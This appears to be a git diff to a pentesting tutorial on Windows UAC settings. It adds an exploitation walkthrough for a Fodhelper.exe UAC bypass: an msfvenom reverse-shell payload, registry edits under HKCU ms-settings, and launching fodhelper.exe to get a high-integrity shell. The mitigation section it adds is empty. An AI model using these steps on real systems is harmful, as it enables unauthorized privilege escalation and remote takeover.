@@ -39,6 +39,7 @@ The default configuration for UAC is **Prompt for consent for non-Windows binari
 The following table illustrates various configuration settings of UAC in a system:
 
 | Prompt Name | Details |
+|:-----------:|:-----------:|
 | **Prompt for consent for non-Windows binaries** | This is the default. When an operation for a non-Microsoft application requires elevation of privilege, the user is prompted on the secure desktop to choose between **Permit** or **Deny**. If the user selects **Permit**, the operation continues with the user's highest available privilege. |
 | **Prompt for credentials:** | An operation that requires elevation of privilege prompts the administrator to enter the user name and password. If the administrator enters valid credentials, the operation proceeds with the appropriate privilege. |
 | **Prompt for consent:** | An operation that requires elevation of privilege prompts the administrator to select **Permit** or **Deny**. If the administrator selects **Permit**, the operation continues with the administrator's highest available privilege. |
@@ -103,6 +104,54 @@ Outcome:
 ![UAC-Tool-Enumeration](/Pictures/UAC-Tool-Enumeration.png)
 
 ## Exploitation
+
+:information_source: This case study leverages a UAC384 bypass that abuses the `Fodhelper.exe` application.
+
+To abuse this scenario you should follow these steps:
+
+1)  Use msfvenom to generate a malicious executable (exe) file:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > nikos.exe
+```
+
+2) Transfer the malicious executable file to victim's machine.
+
+3) Open a listener on your Kali machine.
+
+4) Create with the following PowerShell command a new registry key:
+
+```
+New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
+```
+
+5) Create a new registry entry named "DelegateExecute" under the specified registry path with an empty string as the value:
+
+```
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+```
+
+6) Modify the default command which executed when the specified registry key is triggered:
+
+```
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -exec bypass -c C:\<full_path>\<binary.exe>" -Force
+```
+
+Outcome:
+
+![UAC-Exploitation-1](/Pictures/UAC-Exploitation-1.png)
+
+7) Execute the `fodhelper.exe`:
+
+```
+C:\Windows\System32\fodhelper.exe
+```
+
+8) Verify the new reverse shell from your attacking machine with High Integrity:
+
+![UAC-Exploitation-2](/Pictures/UAC-Exploitation-2.png)
+
+## Mitigation
 
 ## References
 
